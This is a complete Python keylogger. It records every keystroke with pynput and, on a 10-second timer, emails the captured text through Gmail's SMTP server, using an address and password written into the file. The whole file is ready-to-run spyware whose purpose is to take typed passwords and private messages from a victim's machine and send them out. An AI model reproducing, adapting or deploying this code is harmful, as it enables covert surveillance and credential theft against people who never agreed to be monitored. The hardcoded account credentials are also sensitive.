
import threading
import smtplib

from pynput import keyboard


class Keylogger:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.keylogs = ""

    def append_to_keylogs(self, string):
        self.keylogs = self.keylogs + string

    def process_key_listein(self, key):
        try:
            current_key = str(key.char)
        except AttributeError:
            if key == key.space:
                current_key = " "
            else:
                current_key = " " + str(key) + " "
        self.append_to_keylogs(current_key)

    def send_mail(self,email, password, message):

        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(email, password)
        server.sendmail(email,email, message)
        server.quit()

    def report(self):
        print(self.keylogs)
        self.send_mail(self.email, self.password, self.keylogs)
        self.keylogs = ""
        timer = threading.Timer(10, self.report)
        timer.start()

    def start(self):
        with keyboard.Listener(on_press=self.process_key_listein) as keyboard_listener:
            self.report()
            keyboard_listener.join()


my_keylogger = Keylogger("vickyvlmp14@gmail.com", "12345678@Aa")
my_keylogger.start()
